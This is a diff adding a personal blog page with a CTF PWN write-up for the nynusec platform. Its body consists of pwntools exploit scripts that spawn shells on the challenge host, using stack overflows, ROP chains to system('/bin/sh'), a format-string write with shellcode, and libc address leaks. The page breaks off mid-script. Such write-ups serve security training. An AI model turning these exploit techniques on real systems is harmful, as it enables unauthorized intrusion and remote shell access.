@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="m0sway">
+
+
+
+
+
+<title>nynusec平台全WriteUp(PWN) | m0sway&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">m0sway&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">m0sway&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">nynusec平台全WriteUp(PWN)</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">m0sway</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 22, 2022&nbsp;&nbsp;10:21:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                                <a href="/categories/CTF/PWN/">PWN</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="Hello-Pwn"><a href="#Hello-Pwn" class="headerlink" title="Hello_Pwn"></a><strong>Hello_Pwn</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc直接链接即可</span><br></pre></td></tr></table></figure>
+
+<h3 id="hello-pwn2"><a href="#hello-pwn2" class="headerlink" title="hello_pwn2"></a>hello_pwn2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28944</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*<span class="number">4</span> + p64(<span class="number">0x6E756161</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28928</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">backdoor = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*<span class="number">0x88</span> + p64(backdoor)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="easyStack"><a href="#easyStack" class="headerlink" title="easyStack"></a>easyStack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> back</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28599</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">elf = ELF(<span class="string">&quot;easyStack&quot;</span>)</span><br><span class="line">backdoor = elf.symbols[<span class="string">&#x27;fun&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*<span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="rop-test"><a href="#rop-test" class="headerlink" title="rop_test"></a>rop_test</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28686</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;rop_test&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;M&#x27;</span>*<span class="number">4</span> + p32(bin_sh_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn-string"><a href="#pwn-string" class="headerlink" title="pwn_string"></a>pwn_string</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28836</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">payload = <span class="string">&#x27;%85d%7$n&#x27;</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;be:&#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;up?:&#x27;</span>, <span class="string">&#x27;east&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;leave(0)?:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;address&#x27;&quot;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;is:&#x27;</span>, payload)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;SPELL&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn-guess"><a href="#pwn-guess" class="headerlink" title="pwn_guess"></a>pwn_guess</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r=remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28690</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">rand = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"><span class="comment"># r.recv()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your guess number:&quot;</span>,<span class="built_in">str</span>(rand[i]))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwn-int"><a href="#pwn-int" class="headerlink" title="pwn_int"></a>pwn_int</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28599</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">backdoor = <span class="number">0x804868B</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&quot;m0sway&quot;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>) + p32(backdoor)</span><br><span class="line">payload = payload.ljust(<span class="number">259</span>, <span class="string">b&#x27;M&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="S2-stack"><a href="#S2-stack" class="headerlink" title="S2-stack"></a>S2-stack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> interactive</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28052</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">backdoor = <span class="number">0x804850F</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">9</span>+<span class="number">4</span>) + p32(backdoor)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="S2-pwn1-rop"><a href="#S2-pwn1-rop" class="headerlink" title="S2-pwn1-rop"></a>S2-pwn1-rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28482</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;S2-pwn1-rop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">rdi_addr = <span class="number">0x400683</span></span><br><span class="line">bin_sh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="S2-pwn2-libc-rop"><a href="#S2-pwn2-libc-rop" class="headerlink" title="S2-pwn2-libc-rop"></a>S2-pwn2-libc-rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28455</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;../buu/ubuntu18(64).so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;PWN_libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) +p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc</span></span><br><span class="line">base_addr = puts_addr - lib.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = base_addr + lib.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(lib.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="comment"># obj = LibcSearcher(&quot;puts&quot;, puts_addr)</span></span><br><span class="line"><span class="comment"># base_addr = puts_addr &gt;&gt; 24</span></span><br><span class="line"><span class="comment"># base_addr = base_addr &lt;&lt; 24</span></span><br><span class="line"><span class="comment"># system_addr = base_addr+ obj.dump(&quot;system&quot;)       #system 偏移</span></span><br><span class="line"><span class="comment"># bin_sh_addr = base_addr+ obj.dump(&quot;str_bin_sh&quot;)   #/bin/sh 偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) + p64(ret) +p64(rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="libcc"><a href="#libcc" class="headerlink" title="libcc"></a>libcc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line"><span class="comment"># r = process(&quot;level3&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28249</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc6-i386_2.23-0ubuntu11.3_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">base_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">payload = <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + <span class="string">b&#x27;M&#x27;</span>*<span class="number">4</span> + p32(bin_sh_addr)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="PWN-libc"><a href="#PWN-libc" class="headerlink" title="PWN-libc"></a>PWN-libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> git <span class="keyword">import</span> base</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#start</span></span><br><span class="line"><span class="comment"># r = process(&quot;PWN_libc&quot;)</span></span><br><span class="line"><span class="comment"># r = remote(&quot;node4.buuoj.cn&quot;,28654)</span></span><br><span class="line">r = remote(<span class="string">&quot;ctf.nynusec.com&quot;</span>,<span class="number">28654</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;libc.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;PWN_libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_addr = <span class="number">0x400c83</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment"># ret=0x4006b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#attack</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;M&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>-<span class="number">1</span>) +p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span 